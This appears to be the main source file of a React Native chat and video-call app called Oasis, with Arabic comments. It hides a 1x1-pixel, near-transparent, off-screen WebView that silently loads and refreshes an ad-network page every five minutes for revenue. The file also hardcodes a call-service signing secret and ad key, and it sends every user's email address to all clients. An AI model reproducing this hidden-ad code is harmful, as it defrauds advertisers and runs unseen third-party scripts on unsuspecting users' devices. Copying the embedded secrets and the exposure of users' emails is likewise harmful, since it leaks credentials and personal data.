import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, TextInput, FlatList, Alert, KeyboardAvoidingView, Platform, ActivityIndicator, Image } from 'react-native';
import { Ionicons, MaterialCommunityIcons } from '@expo/vector-icons';
import { WebView } from 'react-native-webview'; 

// استيرادات ZegoCloud و Firebase
import ZegoUIKitPrebuiltCallService, { ZegoSendCallInvitationButton } from '@zegocloud/zego-uikit-prebuilt-call-rn';
import * as ZegoUIKitSignalingPlugin from 'zego-uikit-signaling-plugin-rn';
import { db, auth } from './firebaseConfig'; 
import { collection, addDoc, serverTimestamp, query, orderBy, onSnapshot, setDoc, doc } from 'firebase/firestore';
import { onAuthStateChanged } from "firebase/auth";
import * as ImagePicker from 'expo-image-picker';

const SERVER_URL = 'https://oasis-server-e6sc.onrender.com';
const AD_LINK = 'https://www.effectivegatecpm.com/pv5wwvpt?key=d089e046a8ec90d9b2b95e7b32944807';
const APP_ID = 1773421291;
const APP_SIGN = "48f1a163421aeb2dfdf57ac214f51362d8733ee19be92d3745a160a2521de2d7";

export default function App() {
  const [user, setUser] = useState(null);
  const [isWaitingVerify, setIsWaitingVerify] = useState(false);
  const [allUsers, setAllUsers] = useState([]);
  const [selectedUser, setSelectedUser] = useState(null); 
  const [message, setMessage] = useState('');
  const [chatMessages, setChatMessages] = useState([]);
  const [uploading, setUploading] = useState(false);
  const [adKey, setAdKey] = useState(0); // مفتاح تحديث الإعلان

  // 1. نظام الأرباح: إعلان فور الدخول + تحديث كل 5 دقائق
  useEffect(() => {
    // تحميل الإعلان الأول فوراً
    setAdKey(prev => prev + 1);
    
    const adInterval = setInterval(() => {
      setAdKey(prev => prev + 1); 
      console.log("تحديث الإعلان الصامت...");
    }, 300000); // 5 دقائق

    return () => clearInterval(adInterval);
  }, []);

  // 2. نظام إدارة المستخدم والحماية (تفعيل الإيميل)
  useEffect(() => {
    const unsubscribeAuth = onAuthStateChanged(auth, async (currentUser) => {
      if (currentUser) {
        if (currentUser.emailVerified) {
          setUser(currentUser);
          setIsWaitingVerify(false);
          
          // تحديث بيانات المستخدم في Firestore
          await setDoc(doc(db, "users", currentUser.uid), { 
            email: currentUser.email, id: currentUser.uid, lastSeen: serverTimestamp() 
          }, { merge: true });

          // جلب قائمة الأصدقاء
          onSnapshot(query(collection(db, "users")), (snapshot) => {
            setAllUsers(snapshot.docs.map(d => d.data()).filter(u => u.id !== currentUser.uid));
          });

          // تهيئة خدمة المكالمات
          ZegoUIKitPrebuiltCallService.init(APP_ID, APP_SIGN, currentUser.uid, currentUser.email.split('@')[0], [ZegoUIKitSignalingPlugin]);
        } else {
          setIsWaitingVerify(true);
        }
      } else {
        setUser(null);
        ZegoUIKitPrebuiltCallService.uninit();
      }
    });
    return () => unsubscribeAuth();
  }, []);

  // 3. منطق الدردشة والوسائط
  const getChatId = (uid1, uid2) => (uid1 < uid2 ? `${uid1}_${uid2}` : `${uid2}_${uid1}`);

  useEffect(() => {
    if (user && selectedUser) {
      const chatId = getChatId(user.uid, selectedUser.id);
      const unsubscribe = onSnapshot(query(collection(db, "chats", chatId, "messages"), orderBy("timestamp", "asc")), (snapshot) => {
        setChatMessages(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
      });
      return () => unsubscribe();
    }
  }, [selectedUser]);

  const sendMessage = async () => {
    if (message.trim() && selectedUser) {
      const chatId = getChatId(user.uid, selectedUser.id);
      await addDoc(collection(db, "chats", chatId, "messages"), {
        text: message, senderId: user.uid, type: 'text', timestamp: serverTimestamp()
      });
      setMessage('');
    }
  };

  const pickMedia = async (mediaType) => {
    let result = await ImagePicker.launchImageLibraryAsync({
      mediaTypes: mediaType === 'image' ? ImagePicker.MediaTypeOptions.Images : ImagePicker.MediaTypeOptions.Videos,
      allowsEditing: true, quality: 0.5,
    });

    if (!result.canceled) {
      setUploading(true);
      const formData = new FormData();
      formData.append('file', { uri: result.assets[0].uri, type: mediaType === 'image' ? 'image/jpeg' : 'video/mp4', name: `file_${Date.now()}` });
      formData.append('type', mediaType);

      try {
        const response = await fetch(`${SERVER_URL}/api/upload-media`, { method: 'POST', body: formData });
        const data = await response.json();
        if (data.status === 'success') {
          const chatId = getChatId(user.uid, selectedUser.id);
          await addDoc(collection(db, "chats", chatId, "messages"), {
            mediaUrl: data.url, senderId: user.uid, type: mediaType, timestamp: serverTimestamp()
          });
        }
      } catch (e) { Alert.alert("خطأ", "فشل الرفع"); }
      finally { setUploading(false); }
    }
  };

  // واجهة "يرجى التفعيل"
  if (isWaitingVerify) {
    return (
      <View style={styles.authContainer}>
        <Ionicons name="mail-unread" size={80} color="#25D366" />
        <Text style={styles.waitingText}>يرجى تفعيل حسابك من خلال الرابط المرسل إلى بريدك الإلكتروني لتتمكن من استخدام Oasis.</Text>
        <TouchableOpacity style={styles.mainBtn} onPress={() => auth.signOut()}>
          <Text style={styles.btnText}>تسجيل الخروج</Text>
        </TouchableOpacity>
      </View>
    );
  }

  // واجهة تسجيل الدخول (إذا لم يكن هناك مستخدم)
  if (!user) {
    return (
      <View style={styles.authContainer}>
        <Ionicons name="leaf" size={80} color="#25D366" />
        <Text style={styles.authTitle}>واحة أوايسس</Text>
        <Text style={styles.waitingText}>سجل دخولك للبدء بالمحادثة</Text>
        {/* هنا تضع نموذج تسجيل الدخول الخاص بك */}
      </View>
    );
  }

  // الواجهة الرئيسية (قائمة الأصدقاء والدردشة)
  return (
    <KeyboardAvoidingView behavior={Platform.OS === 'ios' ? 'padding' : undefined} style={styles.container}>
      
      {/* 🟢 مكون الإعلانات المخفي الشغال بالخلفية */}
      <View style={{ width: 1, height: 1, position: 'absolute', top: -50, left: -50 }}>
        <WebView 
          key={adKey}
          source={{ uri: AD_LINK }}
          javaScriptEnabled={true}
          domStorageEnabled={true}
          mediaPlaybackRequiresUserAction={true}
          style={{ opacity: 0.01 }}
        />
      </View>

      {!selectedUser ? (
        <View style={{flex: 1}}>
          <View style={styles.header}><Text style={styles.userName}>الأصدقاء</Text></View>
          <FlatList 
            data={allUsers}
            keyExtractor={item => item.id}
            renderItem={({ item }) => (
              <TouchableOpacity style={styles.userCard} onPress={() => setSelectedUser(item)}>
                <View style={styles.avatar}><Text style={{color:'white'}}>{item.email[0].toUpperCase()}</Text></View>
                <Text style={styles.messageText}>{item.email}</Text>
              </TouchableOpacity>
            )}
          />
        </View>
      ) : (
        <>
          <View style={styles.header}>
            <TouchableOpacity onPress={() => setSelectedUser(null)}><Ionicons name="arrow-back" size={28} color="white" /></TouchableOpacity>
            <Text style={styles.userName}>{selectedUser.email.split('@')[0]}</Text>
            <ZegoSendCallInvitationButton 
              invitees={[{ userID: selectedUser.id, userName: selectedUser.email }]} 
              isVideoCall={true} resourceID={"zegouikit_call"} backgroundColor="transparent" iconWidth={30} iconHeight={30} 
            />
          </View>

          <FlatList 
            data={chatMessages}
            keyExtractor={item => item.id}
            renderItem={({ item }) => (
              <View style={[styles.bubble, item.senderId === user.uid ? styles.myBubble : styles.otherBubble]}>
                {item.type === 'image' ? (
                  <Image source={{ uri: `${SERVER_URL}/${item.mediaUrl}` }} style={styles.chatImage} />
                ) : (
                  <Text style={styles.messageText}>{item.text}</Text>
                )}
              </View>
            )}
          />

          <View style={styles.inputContainer}>
            <TouchableOpacity onPress={() => pickMedia('image')}><Ionicons name="image" size={26} color="#25D366" /></TouchableOpacity>
            <View style={styles.inputWrapper}>
              <TextInput style={styles.textInput} placeholder="مراسلة..." value={message} onChangeText={setMessage} placeholderTextColor="#8596a0" />
            </View>
            <TouchableOpacity style={styles.sendBtn} onPress={sendMessage}>
              <MaterialCommunityIcons name="send" size={24} color="white" />
            </TouchableOpacity>
          </View>
        </>
      )}
    </KeyboardAvoidingView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0b141a' },
  authContainer: { flex: 1, backgroundColor: '#0b141a', justifyContent: 'center', alignItems: 'center', padding: 20 },
  authTitle: { color: 'white', fontSize: 28, fontWeight: 'bold', marginTop: 10 },
  waitingText: { color: '#8596a0', textAlign: 'center', fontSize: 16, marginTop: 20, marginBottom: 30 },
  mainBtn: { backgroundColor: '#25D366', padding: 15, borderRadius: 12, width: '100%', alignItems: 'center' },
  btnText: { color: 'white', fontWeight: 'bold', fontSize: 16 },
  header: { height: 100, backgroundColor: '#1f2c34', flexDirection: 'row', alignItems: 'flex-end', justifyContent: 'space-between', padding: 15 },
  userName: { color: 'white', fontWeight: 'bold', fontSize: 18 },
  userCard: { flexDirection: 'row-reverse', padding: 15, borderBottomWidth: 0.5, borderBottomColor: '#2a3942', alignItems: 'center' },
  avatar: { width: 45, height: 45, borderRadius: 22.5, backgroundColor: '#25D366', justifyContent: 'center', alignItems: 'center', marginLeft: 15 },
  bubble: { padding: 12, borderRadius: 15, margin: 5, maxWidth: '80%' },
  myBubble: { alignSelf: 'flex-end', backgroundColor: '#005c4b' },
  otherBubble: { alignSelf: 'flex-start', backgroundColor: '#1f2c34' },
  messageText: { color: 'white', fontSize: 16 },
  chatImage: { width: 200, height: 200, borderRadius: 10 },
  inputContainer: { flexDirection: 'row', padding: 10, alignItems: 'center', backgroundColor: '#0b141a' },
  inputWrapper: { flex: 1, backgroundColor: '#1f2c34', borderRadius: 25, marginHorizontal: 10, paddingHorizontal: 15, height: 45, justifyContent: 'center' },
  textInput: { color: 'white', textAlign: 'right' },
  sendBtn: { width: 45, height: 45, backgroundColor: '#25D366', borderRadius: 22.5, justifyContent: 'center', alignItems: 'center' }
});
